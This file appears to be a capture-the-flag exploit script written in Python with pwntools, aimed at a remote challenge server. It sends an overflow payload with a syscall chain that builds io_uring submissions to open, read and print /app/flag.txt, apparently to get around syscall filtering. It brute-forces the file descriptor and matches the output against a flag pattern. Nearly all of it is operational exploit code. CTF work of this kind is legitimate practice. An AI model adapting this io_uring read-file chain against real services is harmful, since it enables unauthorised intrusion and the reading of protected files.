#!/usr/bin/env python3
"""Decide WHY remote ORW returns empty, and brute the file fd.

Findings so far: io_uring WRITE works remote (proved: 256B + path echoed back),
but OP_READ of /app/flag.txt fills the buffer with zeros.

Probe D : io_uring READ from stdin leftover -> WRITE to stdout.
          shows  -> io_uring READ works remote; flag failure is open/fd specific.
          empty  -> io_uring READ itself is the blocker.
Probe F : full ORW, brute the file fd 3..N (each = 1 connection).

Run:  uv run python remote_probe.py [host] [port]
"""
import os
import re
import sys

from pwn import context, remote

context.arch = "amd64"
context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267


def iouring_ops(ops, ring_fd):
    """Submit each (opcode, fd, addr, len) as its own sqe+enter on ring_fd."""
    c = S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)
    for i, (op, fd, addr, ln) in enumerate(ops):
        c += S.build_sqe(op, fd, addr, ln, 0, 0x1000 + i)
        c += S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, 0)
        c += S.setmem64(S.RINGS + 0, ((i + 1) << 32) | i)  # head=i tail=i+1
        c += S.wsyscall(S.SYS_IO_URING_ENTER, ring_fd, 1, 1, S.IORING_ENTER_GETEVENTS)
    return c


def shoot(chain, extra_stdin=b""):
    payload = b"A" * S.OFF + chain
    assert b"\n" not in payload, "payload has newline"
    try:
        io = remote(HOST, PORT, timeout=8)
    except Exception as ex:
        print(f"  CONNECT FAILED: {ex}")
        return b""
    io.sendline(payload)
    if extra_stdin:
        io.send(extra_stdin)
    data = io.recvall(timeout=6) or b""
    try:
        io.close()
    except Exception:
        pass
    return data


def probe_stdin():
    # no openat2 -> io_uring_setup is first new fd -> ring fd = 3
    c = iouring_ops(
        [(S.IORING_OP_READ, 0, S.FILEBUF, 0x20),
         (S.IORING_OP_WRITE, 1, S.FILEBUF, 0x20)],
        ring_fd=3,
    )
    c += S.wsyscall(231, 0)
    d = shoot(c, extra_stdin=b"IOURING_STDIN_OK\n")
    ok = b"IOURING_STDIN_OK" in d
    print(f"[D stdin-read] {len(d)}B {d[:40]!r}  -> io_uring READ works: {ok}")
    return ok


def probe_flag(file_fd):
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)
    c += iouring_ops(
        [(S.IORING_OP_READ, file_fd, S.FILEBUF, 0x80),
         (S.IORING_OP_WRITE, 1, S.FILEBUF, 0x80)],
        ring_fd=4,
    )
    c += S.wsyscall(231, 0)
    d = shoot(c)
    m = re.search(rb"grey\{[^}]*\}", d)
    return d, (m.group(0).decode() if m else None)


def main():
    print(f"=== {HOST}:{PORT} ===")
    probe_stdin()
    print("--- brute file fd 3..12 (full ORW) ---")
    for fd in range(3, 13):
        d, flag = probe_flag(fd)
        nz = any(d)
        print(f"  fd={fd:2d}: {len(d):3d}B nonzero={nz} flag={flag}")
        if flag:
            print(f"\n[+] FLAG via fd={fd}: {flag}")
            return 0
    print("\n[-] no flag from fd brute; see probe D verdict above")
    return 1


if __name__ == "__main__":
    sys.exit(main())
